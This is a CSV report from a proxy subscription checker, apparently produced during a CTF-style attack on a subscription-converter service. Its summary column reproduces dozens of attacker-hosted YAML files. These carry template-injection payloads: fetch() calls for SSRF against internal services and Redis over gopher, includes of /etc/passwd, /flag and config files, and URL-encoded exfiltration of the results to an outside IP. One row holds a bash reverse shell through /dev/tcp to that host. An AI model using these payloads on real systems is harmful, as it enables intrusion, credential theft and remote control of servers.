原始URL,最终URL,状态,节点数,HTTP码,响应秒数,是否有更新,历史检查,历史更新,更新频率,上次更新时间,摘要
http://164.92.65.169:8888/dump_global2.yaml,http://164.92.65.169:8888/dump_global2.yaml,无有效节点,0,200,0.7,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% if global is defined %} {% set _ = fetch(""http://164.92.65.169:8888/global_exists"") %} {% endif %} {% set clash_new = global.clash.new_field_name %} {% set _ = fetch(""http://164.92.65.169:8888/clash_new?v="" + UrlEncode(clash_new)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/exfil.yaml,http://164.92.65.169:8888/exfil.yaml,无有效节点,0,200,0.7,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""0.0.0.0:9090"" {% set content = fetch(""http://172.24.0.3:25500/readconf?token=password"") %} {% set encoded = UrlEncode(content) %} {% set r = fetch(""http://164.92.65.169:8888/collect?d="" + encoded) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/exfil2.yaml,http://164.92.65.169:8888/exfil2.yaml,无有效节点,0,200,0.7,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set content = fetch(""http://172.24.0.3:25500/readconf?token=password"") %} {% set content2 = fetch(""http://172.24.0.4:8080/short"") %} external-controller: ""{{ content }}"" extra-data: ""{{ content2 }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/exfil_pref.yaml,http://164.92.65.169:8888/exfil_pref.yaml,无有效节点,0,200,0.73,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set pref_content %}{% include ""pref.yml"" %}{% endset %} {% set _ = fetch(""http://164.92.65.169:8888/pref_exfil?d="" + UrlEncode(pref_content)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/extract_test.yaml,http://164.92.65.169:8888/extract_test.yaml,无有效节点,0,200,0.72,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""0.0.0.0:9090"" mixed-port: 7891 extracted: ""{{ replace(fetch(""http://172.24.0.4:8080/?t=1786968101""), ""[\s\S]{0,100}"", """") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/fetch_inner_test.yaml,http://164.92.65.169:8888/fetch_inner_test.yaml,无有效节点,0,200,0.72,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""R:{{ fetch(""http://172.24.0.3:25500/version"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/fetch_myurls.yaml,http://164.92.65.169:8888/fetch_myurls.yaml,无有效节点,0,200,0.72,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""R:{{ fetch(""http://172.24.0.4:8080/?nocache=1786968002"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/fetch_myurls2.yaml,http://164.92.65.169:8888/fetch_myurls2.yaml,无有效节点,0,200,0.83,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: MYURLS_RESULT proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/fetch_test.txt,http://164.92.65.169:8888/fetch_test.txt,无有效节点,0,200,1.11,否,3,1,1/3,2026-09-02 22:04:30,FETCH_TEST_OK 
http://164.92.65.169:8888/fetch_test3.yaml,http://164.92.65.169:8888/fetch_test3.yaml,无有效节点,0,200,0.74,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 mixed-port: 7891 allow-lan: false mode: rule log-level: info external-controller: 0.0.0.0:9090 experimental:   ignore-resolve-fail: true   sniff-tls-sni: true   tracing: false   extra_info: ""{{ fetch(""http://172.24.0.4:8080/?t=1786968027"") }}"" proxies: [] proxy-groups: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/fetch_vps_test.yaml,http://164.92.65.169:8888/fetch_vps_test.yaml,无有效节点,0,200,0.5,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""VPS:{{ fetch(""http://164.92.65.169:8888/fetch_test.txt?t=1786968050"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/find_workdir.yaml,http://164.92.65.169:8888/find_workdir.yaml,无有效节点,0,200,0.19,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""WD:{% include ""pref.yml"" %}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/global_dump.yaml,http://164.92.65.169:8888/global_dump.yaml,无有效节点,0,200,0.18,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""{{ request._args }}"" extra1: ""{{ request.token }}"" extra2: ""{{ global }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/global_var_test.yaml,http://164.92.65.169:8888/global_var_test.yaml,无有效节点,0,200,0.26,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""GLOBAL:{{ global }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/gopher_test.txt,http://164.92.65.169:8888/gopher_test.txt,请求失败,0,200,0.22,否,3,0,0/3,,
http://164.92.65.169:8888/gopher_test_tmpl.yaml,http://164.92.65.169:8888/gopher_test_tmpl.yaml,无有效节点,0,200,0.22,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set data = fetch(""gopher://164.92.65.169:9876/_HELLO_FROM_GOPHER%0D%0A"") %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/gw_test.yaml,http://164.92.65.169:8888/gw_test.yaml,无有效节点,0,200,0.36,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""GW:{{ fetch(""http://172.24.0.1/?t=1786968334"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/headers.txt,http://164.92.65.169:8888/headers.txt,无有效节点,0,200,0.36,否,3,1,1/3,2026-09-02 22:04:30,"HTTP/1.1 200 OK  Content-Type: application/json; charset=utf-8  Date: Thu, 23 Jul 2026 15:03:22 GMT  Content-Length: 3888  ETag: W/""f30-AbuZTrnQHf8W8e0KF5HCxcu+hjk""  X-Powered-By: Express    "
http://164.92.65.169:8888/include_cache_test.yaml,http://164.92.65.169:8888/include_cache_test.yaml,无有效节点,0,200,0.36,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set dummy = fetch(""http://164.92.65.169:8888/fetch_test.txt"") %} external-controller: |   CACHED:   {% include ""cache/4406bf60e97ab2fc9e84b0e1c68266af"" %}   END proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/include_fetch.yaml,http://164.92.65.169:8888/include_fetch.yaml,无有效节点,0,200,0.36,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set _ = fetch(""http://164.92.65.169:8888/before_include"") %} {% include ""pref.yml"" %} {% set _ = fetch(""http://164.92.65.169:8888/after_include"") %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/include_noexist.yaml,http://164.92.65.169:8888/include_noexist.yaml,无有效节点,0,200,0.36,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""{% include ""/nonexistent_file_12345xyz"" %}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/include_pref_test.yaml,http://164.92.65.169:8888/include_pref_test.yaml,无有效节点,0,200,0.5,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set x = fetch(""http://164.92.65.169:8888/fetch_test.txt"") %} notes: ""{{ x }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/include_test.yaml,http://164.92.65.169:8888/include_test.yaml,无有效节点,0,200,0.38,否,3,1,1/3,2026-09-02 22:04:30,"{% include ""group_template"" %} port: 7890 proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/include_traversal.yaml,http://164.92.65.169:8888/include_traversal.yaml,无有效节点,0,200,0.51,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/ipv6_exfil.yaml,http://164.92.65.169:8888/ipv6_exfil.yaml,无有效节点,0,200,0.38,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set data = fetch(""http://[::ffff:172.24.0.4]:8080/"") %} {% set encoded = UrlEncode(data) %} {% set _ = fetch(""http://164.92.65.169:8888/exfil?d="" + encoded) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/ipv6_myurls.yaml,http://164.92.65.169:8888/ipv6_myurls.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""MYURLS:{{ fetch(""http://[::ffff:172.24.0.4]:8080/"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/ipv6_myurls2.yaml,http://164.92.65.169:8888/ipv6_myurls2.yaml,无有效节点,0,200,0.53,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""MYURLS_ROOT:{{ fetch(""http://[::ffff:172.24.0.4]:8080/"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/ipv6_ssrf.yaml,http://164.92.65.169:8888/ipv6_ssrf.yaml,无有效节点,0,200,0.54,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""V6:{{ fetch(""http://[::ffff:172.24.0.3]:25500/"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_template.yaml,http://164.92.65.169:8888/leak_template.yaml,提取成功,1,200,0.73,否,3,1,1/3,2026-09-02 22:04:30,
http://164.92.65.169:8888/leak_template2.yaml,http://164.92.65.169:8888/leak_template2.yaml,无有效节点,0,200,0.78,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 proxies:   - name: ""{{ fetch(""http://172.24.0.3:25500/readconf?token=password"") }}""     type: ss     server: 1.2.3.4     port: 8388     cipher: aes-256-gcm     password: test rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_template3.yaml,http://164.92.65.169:8888/leak_template3.yaml,无有效节点,0,200,0.71,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 proxies:   - name: ""LEAKED_START{{ fetch(""file:///base/pref.yml"") }}LEAKED_END""     type: ss     server: 1.2.3.4     port: 8388     cipher: aes-256-gcm     password: test rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_nocache.yaml,http://164.92.65.169:8888/leak_tmpl_nocache.yaml,无有效节点,0,200,0.48,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""RESULT:{{ fetch(""http://164.92.65.169:8888/fetch_test.txt?t=1786967838"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v10.yaml,http://164.92.65.169:8888/leak_tmpl_v10.yaml,无有效节点,0,200,0.47,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""RESULT:{{ fetch(""http://127.0.0.1:25500/version"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v11.yaml,http://164.92.65.169:8888/leak_tmpl_v11.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""RESULT:{{ fetch(""http://[::1]:25500/version"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v12.yaml,http://164.92.65.169:8888/leak_tmpl_v12.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"{% include ""../pref.yml"" %} mixed-port: 7890 external-controller: ""DONE"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v3.yaml,http://164.92.65.169:8888/leak_tmpl_v3.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 proxies:   - name: ""LEAKED_START{{ fetch(""file:///base/pref.yml"") }}LEAKED_END""     type: ss     server: 1.2.3.4     port: 8388     cipher: aes-256-gcm     password: test rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v4.yaml,http://164.92.65.169:8888/leak_tmpl_v4.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""{{ fetch(""file:///base/pref.yml"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v5.yaml,http://164.92.65.169:8888/leak_tmpl_v5.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""{{ fetch(""http://164.92.65.169:8888/fetch_test.txt"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v6.yaml,http://164.92.65.169:8888/leak_tmpl_v6.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""{{ fetch(""http://172.24.0.3:25500/readconf"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v7.yaml,http://164.92.65.169:8888/leak_tmpl_v7.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""{{ fetch(""http://172.24.0.3:25500/readconf?token=password"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v8.yaml,http://164.92.65.169:8888/leak_tmpl_v8.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""{{ fetch(""http://172.24.0.4:8080/"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/leak_tmpl_v9.yaml,http://164.92.65.169:8888/leak_tmpl_v9.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"mixed-port: 7890 external-controller: ""RESULT:{{ fetch(""http://172.24.0.2:6379/"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/mu_ep_test.yaml,http://164.92.65.169:8888/mu_ep_test.yaml,无有效节点,0,200,0.52,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set data = fetch(""http://[::ffff:172.24.0.4]:8080/urls"") %} {% set _ = fetch(""http://164.92.65.169:8888/myurls_ep?ep=_urls&d="" + UrlEncode(data)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/multi.yaml,http://164.92.65.169:8888/multi.yaml,提取成功,2,200,0.51,否,3,1,1/3,2026-09-02 22:04:30,
http://164.92.65.169:8888/myurls_api.yaml,http://164.92.65.169:8888/myurls_api.yaml,无有效节点,0,200,0.7,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set data = fetch(""http://[::ffff:172.24.0.4]:8080/api/list"") %} {% set _ = fetch(""http://164.92.65.169:8888/myurls_api?d="" + UrlEncode(data)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/myurls_get_create.yaml,http://164.92.65.169:8888/myurls_get_create.yaml,无有效节点,0,200,0.59,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set data = fetch(""http://[::ffff:172.24.0.4]:8080/short?longUrl=aHR0cDovLzE2NC45Mi42NS4xNjk6ODg4OC90ZXN0X3Nob3J0X2ZsYWc=&shortKey=testkey002"") %} {% set _ = fetch(""http://164.92.65.169:8888/short_result?d="" + UrlEncode(data)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/myurls_get_short.yaml,http://164.92.65.169:8888/myurls_get_short.yaml,无有效节点,0,200,0.71,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set data = fetch(""http://[::ffff:172.24.0.4]:8080/short"") %} {% set _ = fetch(""http://164.92.65.169:8888/short_get?d="" + UrlEncode(data)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/myurls_port_test.yaml,http://164.92.65.169:8888/myurls_port_test.yaml,无有效节点,0,200,0.57,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""test_{{ fetch(""http://172.24.0.4:9999/test?t=1786968242"") }}_end"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/paths_probe.yaml,http://164.92.65.169:8888/paths_probe.yaml,无有效节点,0,200,0.67,否,3,1,1/3,2026-09-02 22:04:30,"proxies:   - {name: p0, server: 10.0.0.0, port: 8000, type: ss, cipher: aes-256-gcm, password: x}   - {name: p1, server: 10.0.0.1, port: 8001, type: ss, cipher: aes-256-gcm, password: x}   - {name: p2, server: 10.0.0.2, port: 8002, type: ss, cipher: aes-256-gcm, password: x}   - {name: p3, server: 10.0.0.3, port: 8003, type: ss, cipher: aes-256-gcm, password: x}   - {name: p4, server: 10.0.0.4, port: 8004, type: ss, cipher: aes-256-gcm, password: x}   - {name: p5, server: 10.0.0.5, port: 8005, t"
http://164.92.65.169:8888/payload.txt,http://164.92.65.169:8888/payload.txt,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,"function parse(x){     os.exec([""sh"",""-c"",""ash -i >& /dev/tcp/164.92.65.169/1880 0>&1""],{wait:false})     return ""ss://YWVzLTEyOC1nY206dGVzdA==@127.0.0.1:1234#pwned"" } "
http://164.92.65.169:8888/plain.txt,http://164.92.65.169:8888/plain.txt,无有效节点,0,200,0.72,否,3,1,1/3,2026-09-02 22:04:30,PLAIN_TEXT_CONTENT_12345 
http://164.92.65.169:8888/pref_read.yaml,http://164.92.65.169:8888/pref_read.yaml,无有效节点,0,200,0.72,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 proxies: [] rules:   - MATCH,DIRECT # pref_content: {% include ""/base/pref.yml"" %} "
http://164.92.65.169:8888/probe2.yaml,http://164.92.65.169:8888/probe2.yaml,无有效节点,0,200,0.71,否,3,1,1/3,2026-09-02 22:04:30,"proxies:   - {name: q0, server: 10.0.0.1, port: 8100, type: ss, cipher: aes-256-gcm, password: x}   - {name: q1, server: 10.0.0.2, port: 8101, type: ss, cipher: aes-256-gcm, password: x} "
http://164.92.65.169:8888/probe3.yaml,http://164.92.65.169:8888/probe3.yaml,无有效节点,0,200,0.72,否,3,1,1/3,2026-09-02 22:04:30,"proxies:   - {name: s_ext_hostname, server: 10.0.0.1, port: 8200, type: ss, cipher: aes-256-gcm, password: x}   - {name: s_ext_flag, server: 10.0.0.2, port: 8201, type: ss, cipher: aes-256-gcm, password: x}   - {name: s_ext_zzz, server: 10.0.0.3, port: 8202, type: ss, cipher: aes-256-gcm, password: x} "
http://164.92.65.169:8888/probe4.yaml,http://164.92.65.169:8888/probe4.yaml,无有效节点,0,200,0.72,否,3,1,1/3,2026-09-02 22:04:30,"proxies:   - {name: p0, server: 10.0.0.1, port: 8300, type: ss, cipher: aes-256-gcm, password: x}   - {name: p1, server: 10.0.0.2, port: 8301, type: ss, cipher: aes-256-gcm, password: x}   - {name: p2, server: 10.0.0.3, port: 8302, type: ss, cipher: aes-256-gcm, password: x} "
http://164.92.65.169:8888/read_e2e.yaml,http://164.92.65.169:8888/read_e2e.yaml,无有效节点,0,200,0.71,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 e2e_result: |   {% include ""e2e.txt"" %} e2e_size: |   {% include ""e2e_size.txt"" %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_etc.yaml,http://164.92.65.169:8888/read_etc.yaml,无有效节点,0,200,0.05,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: |   TPL_START   {% include ""/etc/passwd"" %}   TPL_END proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_etc2.yaml,http://164.92.65.169:8888/read_etc2.yaml,无有效节点,0,200,0.05,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% include ""/etc/passwd"" %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_etc_hostname.yaml,http://164.92.65.169:8888/read_etc_hostname.yaml,无有效节点,0,200,0.04,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: |   HOST:   {% include ""/etc/hostname"" %}   END proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_exec_test.yaml,http://164.92.65.169:8888/read_exec_test.yaml,无有效节点,0,200,0.05,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 exec_probe: |   {% include ""exec_test.txt"" %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_find_b64.yaml,http://164.92.65.169:8888/read_find_b64.yaml,无有效节点,0,200,0.69,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 custom_flag: |   {% include ""find_b64.txt"" %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_find_result.yaml,http://164.92.65.169:8888/read_find_result.yaml,无有效节点,0,200,0.69,否,3,1,1/3,2026-09-02 22:04:30,"{% include ""find_result.txt"" %} "
http://164.92.65.169:8888/read_flag.yaml,http://164.92.65.169:8888/read_flag.yaml,无有效节点,0,200,0.69,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""FLAG:{% include ""/flag"" %}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_hostname.yaml,http://164.92.65.169:8888/read_hostname.yaml,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""HOST:{% include ""/proc/sys/kernel/hostname"" %}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_hostname2.yaml,http://164.92.65.169:8888/read_hostname2.yaml,无有效节点,0,200,0.69,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: |   HOST:   {% include ""/proc/sys/kernel/hostname"" %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_hosts_try.yaml,http://164.92.65.169:8888/read_hosts_try.yaml,无有效节点,0,200,0.69,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: |   HOSTS:   {% include ""/etc/hosts"" %}   HOSTS_END proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_osrelease.yaml,http://164.92.65.169:8888/read_osrelease.yaml,无有效节点,0,200,0.04,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: |   OSRELEASE_START   {% include ""/etc/os-release"" %}   OSRELEASE_END proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_pref_rel.yaml,http://164.92.65.169:8888/read_pref_rel.yaml,无有效节点,0,200,0.41,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: |   PREF_START   {% include ""pref.yml"" %}   PREF_END proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_probe.yaml,http://164.92.65.169:8888/read_probe.yaml,无有效节点,0,200,0.04,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 probe_w: |   {% include ""probe_w.txt"" %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/read_proc.yaml,http://164.92.65.169:8888/read_proc.yaml,无有效节点,0,200,0.04,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""PROC:{% include ""/proc/version"" %}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/redis_keys.yaml,http://164.92.65.169:8888/redis_keys.yaml,无有效节点,0,200,0.64,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set data = fetch(""gopher://[::ffff:172.24.0.2]:6379/_%2A2%0D%0A%244%0D%0AKEYS%0D%0A%241%0D%0A%2A%0D%0A"") %} {% set _ = fetch(""http://164.92.65.169:8888/redis?d="" + UrlEncode(data)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/request_dump.yaml,http://164.92.65.169:8888/request_dump.yaml,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""ARGS:{{ request._args }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/shell.txt,http://164.92.65.169:8888/shell.txt,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,Listening on 0.0.0.0 1880 
http://164.92.65.169:8888/simple_extract.yaml,http://164.92.65.169:8888/simple_extract.yaml,无有效节点,0,200,0.67,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""0.0.0.0:9090"" {% set content = fetch(""http://172.24.0.4:8080/"") %} {% set short_content = content | truncate(200) %} extracted: ""{{ short_content }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/simple_test.txt,http://164.92.65.169:8888/simple_test.txt,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,proxies: [] 
http://164.92.65.169:8888/ssrf_bypass.yaml,http://164.92.65.169:8888/ssrf_bypass.yaml,无有效节点,0,200,0.04,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""R1:{{ fetch(""http://127.1/"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/sub_ver_exfil.yaml,http://164.92.65.169:8888/sub_ver_exfil.yaml,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set data = fetch(""http://[::ffff:172.24.0.3]:25500/version"") %} {% set _ = fetch(""http://164.92.65.169:8888/version_exfil?d="" + UrlEncode(data)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/sub_version.yaml,http://164.92.65.169:8888/sub_version.yaml,无有效节点,0,200,0.67,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""VER:{{ fetch(""http://[::ffff:172.24.0.3]:25500/version"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/test.yaml,http://164.92.65.169:8888/test.yaml,提取成功,1,200,0.66,否,3,1,1/3,2026-09-02 22:04:30,
http://164.92.65.169:8888/test_curly.txt,http://164.92.65.169:8888/test_curly.txt,无有效节点,0,200,0.66,否,3,1,1/3,2026-09-02 22:04:30,BEFORE_CURLY {{ nonexistent_var }} AFTER_CURLY 
http://164.92.65.169:8888/test_custom_field.yaml,http://164.92.65.169:8888/test_custom_field.yaml,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 socks-port: 7891 custom_secret_field: ""CUSTOM_VALUE_123"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/test_global_nested.yaml,http://164.92.65.169:8888/test_global_nested.yaml,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set v = global.clash.new_field_name %} {% set _ = fetch(""http://164.92.65.169:8888/nested?v="" + UrlEncode(v)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/test_global_simple.yaml,http://164.92.65.169:8888/test_global_simple.yaml,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set _ = fetch(""http://164.92.65.169:8888/start_test"") %} {% set v = global.clash.new_field_name %} {% set _ = fetch(""http://164.92.65.169:8888/after_global?v="" + UrlEncode(v)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/test_managed2.yaml,http://164.92.65.169:8888/test_managed2.yaml,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set _ = fetch(""http://164.92.65.169:8888/before_managed"") %} {% set mv = global.managed_config_prefix %} {% set _ = fetch(""http://164.92.65.169:8888/after_managed?v="" + mv) %} proxies: [] rules:   - MATCH,DIRECT "
